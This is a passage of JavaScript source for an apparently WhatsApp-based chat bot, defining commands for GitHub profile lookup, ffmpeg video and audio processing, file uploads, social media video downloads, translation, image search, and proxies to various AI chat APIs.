    aj = await githubstalk.githubstalk(`${q}`);
    PhistarBotInc.sendMessage(m.chat, { 
        image: { url: aj.profile_pic }, 
        caption: 
`\`𝐆𝐈𝐓𝐇𝐔𝐁 𝐒𝐓𝐀𝐋𝐊𝐄𝐑\`

ᴜsᴇʀɴᴀᴍᴇ : ${aj.username}
ɴɪᴄᴋɴᴀᴍᴇ : ${aj.nickname}
ʙɪᴏ : ${aj.bio}
ɪᴅ : ${aj.id}
ɴᴏᴅᴇɪᴅ : ${aj.nodeId}
ᴜʀʟ ᴘʀᴏғɪʟᴇ : ${aj.profile_pic}
ᴜʀʟ ɢɪᴛʜᴜʙ : ${aj.url}
ᴛʏᴘᴇ : ${aj.type}
ᴀᴅᴍɪɴ : ${aj.admin}
ᴄᴏᴍᴘᴀɴʏ : ${aj.company}
ʙʟᴏɢ : ${aj.blog}
ʟᴏᴄᴀᴛɪᴏɴ : ${aj.location}
ᴇᴍᴀɪʟ : ${aj.email}
ᴘᴜʙʟɪᴄ ʀᴇᴘᴏ : ${aj.public_repo}
ᴘᴜʙʟɪᴄ ɢɪsᴛs : ${aj.public_gists}
Followers : ${aj.followers}
ғᴏʟʟᴏᴡɪɴɢ : ${aj.following}
ᴄʀᴇᴀᴛᴇᴅ ᴀᴛ : ${aj.created_at}
ᴜᴘᴅᴀᴛᴇᴅ ᴀᴛ : ${aj.updated_at}
> ᴘᴏᴡᴇʀᴇᴅ ʙʏ inconnu tech` 
    }, { quoted: qtext2 });
}
break;

case 'hdvid':
case 'hdvideo':
case 'vidiohd':
case 'tohd':
case 'vidhd': {
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
    if (!mime) return replyphistar(`Where is the video?`);

    // React to the message
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `🔄`, key: m.key } });

    // Download the media file
    const media = await PhistarBotInc.downloadAndSaveMediaMessage(q);

    const output = 'output.mp4'; // Output file name

    // Enhance the video resolution using ffmpeg
    exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, async (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            replyphistar('Failed to enhance video resolution.');
            fs.unlinkSync(media); // Clean up
            return;
        }

        console.log(`stdout: ${stdout}`);
        console.error(`stderr: ${stderr}`);

        // Upload the enhanced video to Catbox
        try {
            const catboxUrl = await catboxUploader(output); // ✅ Use your uploader here

            // Send the Catbox URL back to the chat
            await PhistarBotInc.sendMessage(
                m.chat,
                { 
                    caption: `sᴜᴄᴄᴇsғᴜʟʟʏ ᴇɴʜᴀɴᴄᴇᴅ ʏᴏᴜʀ ᴠɪᴅᴇᴏ\n\n🌐 ${catboxUrl}\n\n> ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ 𝐧𝐨𝐠𝐚𝐦𝐞 𝐭𝐞𝐜𝐡`, 
                    video: { url: output } 
                }, 
                { quoted: qtext2 }
            );
        } catch (uploadError) {
            console.error(uploadError.message);
            replyphistar('Failed to upload the video to Catbox.');
        }

        // Clean up temporary files
        fs.unlinkSync(output);
        fs.unlinkSync(media);
    });
}
break;

case 'cut': {
    if (!m.quoted || !m.quoted.mimetype || !/audio/.test(m.quoted.mimetype)) {
        return replyphistar('❌ *Reply to an audio file with the format:* `.cut 0:12/0:52`');
    }

    let args = text.split('/');
    if (args.length !== 2) return replyphistar('❌ *Invalid format! Use:* `.cut start_time/end_time` (e.g., `.cut 0:12/0:52`)');

    function parseTime(time) {
        let [minutes, seconds] = time.split(':').map(Number);
        return minutes * 60 + seconds; // Convert to total seconds
    }

    let startTime = parseTime(args[0]);
    let endTime = parseTime(args[1]);

    if (isNaN(startTime) || isNaN(endTime) || startTime >= endTime) {
        return replyphistar('❌ *Invalid time range! Make sure the start time is before the end time.*');
    }

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✂️`, key: m.key } });

        // Download the audio file correctly
        let mediaFile = await PhistarBotInc.downloadAndSaveMediaMessage(m.quoted);
        if (!fs.existsSync(mediaFile)) return replyphistar('❌ *Failed to download the audio file.*');

        let fileExtension = path.extname(mediaFile);
        let outputAudio = `./tmp/cut_audio${fileExtension}`;
        let outputDocument = `./tmp/cut_audio_doc${fileExtension}`;

        // Function to execute FFmpeg command
        const execPromise = (cmd) => new Promise((resolve, reject) => {
            exec(cmd, (error, stdout, stderr) => {
                if (error) reject(error);
                else resolve(stdout || stderr);
            });
        });

        // Trim audio using FFmpeg
        await execPromise(`ffmpeg -i "${mediaFile}" -ss ${startTime} -to ${endTime} -c copy "${outputAudio}"`);
        await execPromise(`ffmpeg -i "${mediaFile}" -ss ${startTime} -to ${endTime} -c copy "${outputDocument}"`);

        // Send the trimmed audio as a voice message
        await PhistarBotInc.sendMessage(m.chat, {
            audio: { url: outputAudio },
            mimetype: 'audio/mp4',
            ptt: false
        }, { quoted: qtext2 });

        // Send the trimmed audio as a document
        await PhistarBotInc.sendMessage(m.chat, {
            document: { url: outputDocument },
            mimetype: 'audio/mp3',
            fileName: `Trimmed_Audio${fileExtension}`
        }, { quoted: qtext2 });

        // Delete temporary files after sending
        fs.unlinkSync(mediaFile);
        fs.unlinkSync(outputAudio);
        fs.unlinkSync(outputDocument);

        replyphistar('✅ *ᴀᴜᴅɪᴏ sᴜᴄᴄᴇssғᴜʟʟʏ ᴛʀɪᴍᴍᴇᴅ!*');

    } catch (error) {
        console.error('Error trimming audio:', error);
        replyphistar('❌ *Failed to trim the audio. Please try again.*');
    }
    
    break;
}
        
case 'tourl': case 'imgtourl': case 'imgurl': case 'url': case 'geturl': case 'upload': {
  try {
    // petite réaction pour indiquer que le bot traite la requête
    await PhistarBotInc.sendMessage(from, { react: { text: "🖇", key: m.key } });

    const quotedMsg = m.quoted ? m.quoted : m;
    const mimeType = (quotedMsg.msg || quotedMsg).mimetype || '';

    if (!mimeType) {
      return replyphistar("❌ ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀɴ ɪᴍᴀɢᴇ, ᴠɪᴅᴇᴏ, ᴏʀ ᴀᴜᴅɪᴏ ғɪʟᴇ");
    }

    // download media (fonctionne si quotedMsg.download() est dispo dans ton framework)
    const mediaBuffer = await quotedMsg.download();
    const tempFilePath = path.join(os.tmpdir(), `catbox_upload_${Date.now()}`);
    fs.writeFileSync(tempFilePath, mediaBuffer);

    // déterminer extension
    let extension = '';
    if (mimeType.includes('image/jpeg')) extension = '.jpg';
    else if (mimeType.includes('image/png')) extension = '.png';
    else if (mimeType.includes('image/webp')) extension = '.webp';
    else if (mimeType.includes('video')) extension = '.mp4';
    else if (mimeType.includes('audio')) extension = '.mp3';
    else extension = path.extname(quotedMsg.filename || '') || '';

    const fileName = `file${extension}`;

    // préparation du form-data et upload vers Catbox
    const form = new FormData();
    form.append('fileToUpload', fs.createReadStream(tempFilePath), fileName);
    form.append('reqtype', 'fileupload');

    const response = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders()
    });

    if (!response.data) throw new Error("Error uploading to Catbox");

    const mediaUrl = response.data;

    // suppression du fichier temporaire (silent fail si erreur)
    try { fs.unlinkSync(tempFilePath); } catch (e) {}

    // déterminer type pour l'affichage
    let mediaType = 'File';
    if (mimeType.includes('image')) mediaType = 'Image';
    else if (mimeType.includes('video')) mediaType = 'Video';
    else if (mimeType.includes('audio')) mediaType = 'Audio';

    // helper local formatBytes (défini ici pour éviter l'erreur 'not defined')
    const formatBytes = (bytes) => {
      if (!bytes) return '0 Bytes';
      const k = 1024;
      const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
      const i = Math.floor(Math.log(bytes) / Math.log(k));
      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    };

    const resultMsg =
      `*${mediaType} ᴜᴘʟᴏᴀᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ✅*\n\n` +
      `*Size:* ${formatBytes(mediaBuffer.length)}\n` +
      `*URL:* ${mediaUrl}\n\n` +
      `> © ᴜᴘʟᴏᴀᴅᴇᴅ ʙʏ 𝐧𝐨𝐠𝐚𝐦𝐞 𝐭𝐞𝐜𝐡`;

    await PhistarBotInc.sendMessage(m.chat, { text: resultMsg }, { quoted: qtext2 });

  } catch (e) {
    console.error(e);
    await replyphistar(`❌ Error: ${e.message || e}`);
  }
}
break;
        
case 'setbio': {
    if (!isCreator) return replyphistar('ғᴏʀ ᴍʏ ᴏᴡɴᴇʀ ᴏɴʟʏ');
    if (!text) return replyphistar(`ᴡʜᴇʀᴇ ɪs ᴛʜᴇ ᴛᴇxᴛ?\nᴇxᴀᴍᴘʟᴇ: ${prefix + command} inconnu boy`);
    
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `✍🏼`, key: m?.key } });
    await PhistarBotInc.updateProfileStatus(text);
    replyphistar('`sᴜᴄᴄᴇss ɪɴ ᴄʜᴀɴɢɪɴɢ ʙɪᴏ, ʙᴏss!!🫡`');
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
}
break;

case 'listonline':
case 'listactive':
case 'here': {
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎙`, key: m.key } });

    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
    let online = [...Object.keys(store.presences[id]), botNumber];
    let liston = 1;
    await PhistarBotInc.sendMessage(m.chat, {
        text: '  「 *ᴏɴʟɪɴᴇ ᴍᴇᴍʙᴇʀs* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`,
        mentions: online
    }, { quoted: qtext2 });
}
break;

case 'totalfeature':
case 'totalfitur':
case 'totalcmd':
case 'totalcommand': {
    replyphistar(`${totalfitur}`);
}
break;


case 'download':
case 'dl': {
    if (!text) return replyphistar(`❌ Please provide a valid link.\n\n*Example:* ${prefix + command} <TikTok/Facebook/Instagram/Twitter link>`);

    try {
        // Show waiting message
        await replyphistar('⏳ ᴘʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ ᴅᴏᴡɴʟᴏᴀᴅ ʀᴇǫᴜᴇsᴛ...');

        // ✅ PrexzyVilla All-in-One Downloader API V3
        const apiUrl = `https://apis.prexzyvilla.site/download/aioV3?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (data && data.status && data.data && data.data.medias && data.data.medias.length > 0) {
            const videoInfo = data.data;

            // Prioritize no_watermark > hd_no_watermark > watermark versions
            const videoFile = videoInfo.medias.find(v => v.type === "video" && v.quality === "no_watermark") ||
                             videoInfo.medias.find(v => v.type === "video" && v.quality === "hd_no_watermark") ||
                             videoInfo.medias.find(v => v.type === "video" && v.quality === "watermark") ||
                             videoInfo.medias.find(v => v.type === "video");

            if (!videoFile || !videoFile.url) {
                return replyphistar(`❌ No downloadable video found.`);
            }

            console.log('Selected video URL:', videoFile.url);

            // Format file size for display
            const formatFileSize = (bytes) => {
                if (!bytes) return 'Unknown';
                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(1024));
                return Math.round(bytes / Math.pow(1024, i) * 100) / 100 + ' ' + sizes[i];
            };

            // Send the video
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: videoFile.url },
                mimetype: 'video/mp4',
                fileName: `phistar_${Date.now()}.mp4`,
                caption: `🎥 *ᴘʟᴀᴛғᴏʀᴍ:* ${videoInfo.source || "Unknown"}\n👤 *ᴀᴜᴛʜᴏʀ:* ${videoInfo.author || "Unknown"}\n📝 *ᴛɪᴛʟᴇ:* ${videoInfo.title || "Untitled"}\n⏱ *ᴅᴜʀᴀᴛɪᴏɴ:* ${Math.round(videoInfo.duration / 1000) || 'Unknown'}s\n📦 *Size:* ${formatFileSize(videoFile.data_size) || 'Unknown'}\n🎯 *ǫᴜᴀʟɪᴛʏ:* ${videoFile.quality || 'Standard'}\n\n✅ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ`
            }, { quoted: qtext2 });

        } else {
            replyphistar(`❌ Unable to fetch the video. Please check the URL and try again.`);
        }

    } catch (error) {
        console.error('Error in Download command:', error.message);
        replyphistar(`❌ An error occurred while processing your request. Please try again later.\nError: ${error.message}`);
    }
    break;
}
case 'ig':
case 'instadl': {
    if (!text) return replyphistar(`❌ Please provide an Instagram reel/video link.\n\n*Example:* ${prefix + command} <link>`);

    try {
        // Show waiting message
        await replyphistar('⏳ Downloading Instagram video...');

        // ✅ PrexzyVilla Instagram V3 download API (recommended)
        const apiUrl = `https://apis.prexzyvilla.site/download/instagramV3?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (data && data.status && data.data && data.data.url && data.data.url.length > 0) {
            const videoInfo = data.data;

            // Find the best video URL (MP4 format)
            const videoFile = videoInfo.url.find(v => v.type === "mp4") || videoInfo.url[0];

            if (!videoFile || !videoFile.url) {
                return replyphistar(`❌ No downloadable Instagram video found.`);
            }

            // Extract filename from URL or use default
            let fileName = "Instagram_Video.mp4";
            if (videoFile.filename) {
                fileName = videoFile.filename;
            } else if (videoFile.url.includes("filename=")) {
                const filenameMatch = videoFile.url.match(/filename=([^&]+)/);
                if (filenameMatch && filenameMatch[1]) {
                    fileName = decodeURIComponent(filenameMatch[1]);
                }
            }

            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: videoFile.url },
                mimetype: 'video/mp4',
                fileName: fileName,
                caption: `📸 *ɪɴsᴛᴀɢʀᴀᴍ ᴅᴏᴡɴʟᴏᴀᴅ*\n📝 *ᴛɪᴛʟᴇ:* ${fileName.replace('.mp4', '')}\n✅ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ`
            }, { quoted: qtext2 });

        } else {
            replyphistar(`❌ Unable to fetch the Instagram video. Please check the URL and try again.`);
        }

    } catch (error) {
        console.error('Error in Instagram download:', error.message);
        replyphistar(`❌ An error occurred while processing your request. Please try again later.\nError: ${error.message}`);
    }
    break;
}
case 'tiktok':
case 'tt':
case 'tiktokdl': {
    if (!text) return replyphistar(`*ᴇxᴀᴍᴘʟᴇ:* ${prefix + command} <ᴜʀʟ ᴏʀ ʟɪɴᴋ>`);

    try {
        // ✅ PrexzyVilla TikTok download API
        const apiUrl = `https://apis.prexzyvilla.site/download/tiktokV5?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        let videoUrl = null;
        let title = "TikTok Video";

        // Case 1: API format with downloadsVideo (array)
        if (data?.data?.downloadsVideo && Array.isArray(data.data.downloadsVideo)) {
            const hdVideo = data.data.downloadsVideo.find(v => v.quality.toLowerCase().includes("hd"));
            videoUrl = hdVideo ? hdVideo.url : data.data.downloadsVideo[0]?.url;
            title = data.data.title || title;
        }

        // Case 2: API format with data.result.downloadUrls (array)
        else if (data?.data?.result?.downloadUrls && Array.isArray(data.data.result.downloadUrls)) {
            const mp4Video = data.data.result.downloadUrls.find(v => v.type === "mp4");
            videoUrl = mp4Video ? mp4Video.url : data.data.result.downloadUrls[0]?.url;
            title = data.data.result.title || title;
        }

        if (!videoUrl) {
            return replyphistar(`❌ No downloadable video found in response.\n\nResponse: ${JSON.stringify(data, null, 2)}`);
        }

        // ✅ Send video to user
        await PhistarBotInc.sendMessage(m.chat, {
            video: { url: videoUrl },
            mimetype: 'video/mp4',
            fileName: `TikTok_Video.mp4`,
            caption: `🎥 *ᴛɪᴛʟᴇ:* ${title}\n> ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ✅`
        }, { quoted: qtext2 });

    } catch (error) {
        console.error("Error in TikTok Downloader:", error.message);
        replyphistar(`*❌ An error occurred while downloading the TikTok video.*`);
    }
    break;
}

case 'fb':
case 'facebook': {
    if (!text) return replyphistar(`❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ғᴀᴄᴇʙᴏᴏᴋ ᴠɪᴅᴇᴏ/ʀᴇᴇʟ ʟɪɴᴋ.\n\n*ᴇxᴀᴍᴘʟᴇ:* ${prefix + command} <link>`);

    try {
        // Show waiting message
        await replyphistar('⏳ ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ғᴀᴄᴇʙᴏᴏᴋ ᴠɪᴅᴇᴏ...');

        // ✅ PrexzyVilla Facebook download API
        const apiUrl = `https://apis.prexzyvilla.site/download/facebook?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (data && data.status && data.data && data.data.video && data.data.video.length > 0) {
            const videoInfo = data.data;
            
            // Prioritize higher quality videos (1080p > 720p > others)
            const videoFile = videoInfo.video.find(v => v.quality === "1080p") ||
                             videoInfo.video.find(v => v.quality === "720p (HD)") ||
                             videoInfo.video.find(v => v.quality.includes("720")) ||
                             videoInfo.video.find(v => v.quality.includes("HD")) ||
                             videoInfo.video[0];

            if (!videoFile || !videoFile.url) {
                return replyphistar(`❌ No downloadable Facebook video found.`);
            }

            // Check if URL is from snapcdn (needs special handling)
            let downloadUrl = videoFile.url;
            if (downloadUrl.includes('snapcdn.app')) {
                // For snapcdn URLs, we might need to handle them differently
                console.log('SnapCDN URL detected:', downloadUrl);
            }

            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: downloadUrl },
                mimetype: 'video/mp4',
                fileName: `Facebook_${Date.now()}.mp4`,
                caption: `📘 *ғᴀᴄᴇʙᴏᴏᴋ ᴅᴏᴡɴʟᴏᴀᴅ*\n🎥 *ᴛɪᴛʟᴇ:* ${videoInfo.title || 'Facebook Video'}\n⏱ *ᴅᴜʀᴀᴛɪᴏɴ:* ${videoInfo.duration || 'Unknown'}\n🎯 *ǫᴜᴀʟɪᴛʏ:* ${videoFile.quality || 'Standard'}\n✅ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ`
            }, { quoted: qtext2 });

        } else {
            replyphistar(`❌ Unable to fetch the Facebook video. Please check the URL and try again.`);
        }

    } catch (error) {
        console.error('Error in Facebook download:', error.message);
        replyphistar(`❌ An error occurred while processing your request. Please try again later.\nError: ${error.message}`);
    }
    break;
}

    case 'gemini2': {
    if (!text) {
        return replyphistar('❓ *Please provide a query for Gemini AI.*');
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/gemini', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('❌ *Failed to get a response from Gemini AI.*');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        replyphistar('❌ *An error occurred while connecting to Gemini AI. Please try again later.*');
    }
    break;
}
case 'gemini': {
    if (!text) {
        return replyphistar('❓ *Please provide a query for Gemini AI.*');
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/acloudai', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('❌ *Failed to get a response from Gemini AI.*');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        replyphistar('❌ *An error occurred while connecting to Gemini AI. Please try again later.*');
    }
    break;
}


// ================= TRANSLATE ================= //
case "translate": case "trt": {
    let lang, text;
    if (args.length >= 2) {
        lang = args[0] ? args[0] : 'id';
        text = args.slice(1).join(' ');
    } else if (m?.quoted?.text) {
        lang = args[0] ? args[0] : 'id';
        text = m.quoted.text;
    } else return replyphistar(`Example:\n${prefix + command} id Hello I'm ᴍᴇɢᴀʟᴏᴅᴏɴ ᴛɢ`);

    try {
        let res = await translate(text, { to: lang, autoCorrect: true });
        replyphistar(
            `*ᴛʀᴀɴsʟᴀᴛɪᴏɴ*\n\n` +
            `🔍 *ᴅᴇᴛᴇᴄᴛᴇᴅ:* ${res.from.language.iso.toUpperCase()}\n` +
            `🌐 *ᴛᴀʀɢᴇᴛ:* ${lang.toUpperCase()}\n\n` +
            `📝 *ᴏʀɪɢɪɴᴀʟ:* ${text}\n\n` +
            `💬 *ᴛʀᴀɴsʟᴀᴛɪᴏɴ:* ${res.text}`
        );
    } catch (e) {
        replyphistar(`❌ Language "${lang}" not supported\nType ${prefix}languages for supported languages`);
    }
    break;
}


case 'imgsearch': case 'img': {
    if (!text) {
        return replyphistar(`*ᴜsᴀɢᴇ:* .ʙɪɴɢɪᴍɢ <ǫᴜᴇʀʏ>\n\n*ᴇxᴀᴍᴘʟᴇ:* .ɪᴍɢ ᴄᴀᴛ`);
    }

    try {
        // Call the Bing Image Search API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/s/bimg`, {
            params: { query: text }
        });

        if (apiResponse.status === 200 && apiResponse.data.status) {
            const images = apiResponse.data.data;

            if (images.length === 0) {
                return replyphistar(`No images found for "${text}". Please try another query.`);
            }

            // Send up to 5 images
            const maxImages = Math.min(images.length, 5);
            for (let i = 0; i < maxImages; i++) {
                await PhistarBotInc.sendMessage(m.chat, {
                    image: { url: images[i] },
                    caption: `🔎 *ɪᴍᴀɢᴇ sᴇᴀʀᴄʜ ʀᴇsᴜʟᴛs*\n\n📄 *ǫᴜᴇʀʏ:* "${text}"\n📷 *ɪᴍᴀɢᴇ ${i + 1}/${maxImages}*`,
                }, { quoted: qtext2 });
            }
        } else {
            replyphistar(`❌ *ERROR:* Failed to fetch images. Please try again.`);
        }
    } catch (error) {
        console.error('Error in Image Search command:', error);
        replyphistar(`❌ *AN ERROR OCCURRED:* ${error.message}`);
    }
    break;
}
    case "apk":
case "apkdl": {
    if (!text) return replyphistar("✨ *Please specify the APK you want to download!*");

    try {
        // Fetch APK search results
        let kyuu = await fetchJson(`https://bk9.fun/search/apk?q=${text}`);
        if (!kyuu.BK9 || kyuu.BK9.length === 0) {
            return replyphistar("❌ *No APKs found for the given search query.*");
        }

        // Fetch APK download link
        let tylor = await fetchJson(`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
        
        // Send download link
        const downloadMessage = `🎮 *APK Download Link*\n\n` +
                                `📦 *ɴᴀᴍᴇ:* ${tylor.BK9.name}\n` +
                                `🔗 *Download Link:* [Click Here](${tylor.BK9.dllink})\n`;

        await PhistarBotInc.sendMessage(
            m.chat,
            {
                text: downloadMessage,
                contextInfo: {
                    externalAdReply: {
                        title: `Download APK: ${tylor.BK9.name}`,
                        body: "Click the link to download the APK!",
                        thumbnailUrl: tylor.BK9.thumb, // Using the app's URL thumbnail image
                        sourceUrl: tylor.BK9.dllink,
                        mediaType: 2,
                        showAdAttribution: true,
                        renderLargerThumbnail: true
                    }
                }
            },
            { quoted: qtext2 }
        );
    } catch (error) {
        console.error('Error in APK command:', error);
        replyphistar("❌ *An error occurred while processing the request. Please try again later.*");
    }
    break;
}

//AI V3
    case 'chatgpt': case 'gpt': case 'llama': {
    if (!text) return replyphistar(`❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴘʀᴏᴍᴘᴛ.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(
            `https://api.giftedtech.co.ke/api/ai/mistral?apikey=gifted&q=${encodeURIComponent(text)}`
        );

        if (response.data && response.data.success) {
            replyphistar(response.data.result);  // <-- use .result
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌ API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}
// Add these cases to your command handler



case 'chatgpt4': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    // Show typing indicator
    await PhistarBotInc.sendPresenceUpdate('composing', m.chat);
    
    const response = await axios.get(
      `https://apis.prexzyvilla.site/ai/gpt4?text=${encodeURIComponent(text)}`,
      { timeout: 30000 }
    );

    if (response.data && response.data.status) {
      replyphistar(response.data.data);
    } else {
      replyphistar(`❌ Failed to get a response from the AI.`);
    }
    
    // Stop typing indicator
    await PhistarBotInc.sendPresenceUpdate('paused', m.chat);
    
  } catch (error) {
    console.error("❌ ChatGPT API Error:", error);
    replyphistar(`❌ An error occurred while fetching the response. Please try again later.`);
  }
  break;
}
case 'chatgpt4o': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/gpt4o?apikey=gifted&q=${encodeURIComponent(text)}`
    );

    if (response.data && response.data.success) {
      replyphistar(response.data.result);
    } else {
      replyphistar(`❌ Failed to get a response.`);
    }
  } catch (error) {
    console.error("❌ API Error:", error);
    replyphistar(`❌ An error occurred while fetching the response.`);
  }
  break;
}
case 'deepseek': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/deepseek-v3?apikey=gifted&q=${encodeURIComponent(text)}`
    );

    console.log("Deepseek-v3 raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ Failed to get a response. Response was: ${JSON.stringify(response.data)}`);
    }
  } catch (error) {
    console.error("❌ Deepseek-v3 API Error:", error);
    replyphistar(`❌ An error occurred while contacting Deepseek-v3: ${error.message}`);
  }
  break;
}
case 'deepseek-r1': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/deepseek-r1?apikey=gifted&q=${encodeURIComponent(text)}`
    );

    console.log("Deepseek-r1 raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ Failed to get a valid response. Full response:\n${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ Deepseek-r1 API Error:", error.response ? error.response.data : error.message);
    replyphistar(`❌ An error occurred while contacting DeepSeek-R1: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'geminiapro': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/geminiaipro?apikey=gifted&q=${encodeURIComponent(text)}`
    );
    console.log("GeminiAIPRO raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ No valid success flag. Full response: ${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ GeminiAIPRO API Error:", error.response ? error.response.data : error.message);
    replyphistar(`❌ An error occurred while contacting GeminiAIPRO: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'blackbox': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/blackbox?apikey=gifted&q=${encodeURIComponent(text)}`
    );
    console.log("Blackbox raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ No valid success flag. Full response:\n${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ Blackbox API Error:", error.response ? error.response.data : error.message);
    replyphistar(`❌ An error occurred while contacting Blackbox: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'openai': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/openai?apikey=gifted&q=${encodeURIComponent(text)}`
    );
    console.log("OpenAI raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ No valid success flag. Full response:\n${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ OpenAI API Error:", error.response ? JSON.stringify(error.response.data) : error.message);
    replyphistar(`❌ An error occurred while contacting OpenAI endpoint: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'chatai': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/chat?apikey=gifted&q=${encodeURIComponent(text)}`
    );
    console.log("Chat endpoint raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ No valid success flag. Full response:\n${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ Chat API Error:", error.response ? JSON.stringify(error.response.data) : error.message);
    replyphistar(`❌ An error occurred while contacting Chat endpoint: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'fluximg': {
  if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} a sunset over the mountains`);

  await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

  try {
    const { data, status } = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/fluximg?apikey=gifted&prompt=${encodeURIComponent(text)}`
    );
    console.log("fluximg response status:", status);
    console.log("fluximg response data:", data);

    if (data && (data.success || data.result || data.url)) {
      // Adjust based on actual field returned (result, image, url, etc.)
      return replyphistar(`🖼 Flux Image:\n${data.result || data.url}`);
    } else {
      return replyphistar(
        `❌ fluximg endpoint responded unexpectedly.\n\nStatus: ${status}\nResponse: ${JSON.stringify(data, null, 2)}`
      );
    }
  } catch (err) {
    console.error("fluximg API error:", err.response ? err.response.data : err.message);
    return replyphistar(
      `❌ An error occurred while contacting fluximg.\n\n${err.response ? JSON.stringify(err.response.data) : err.message}`
    );
  }
  break;
}

case 'tiktokstalk':
case 'ttstalk': {
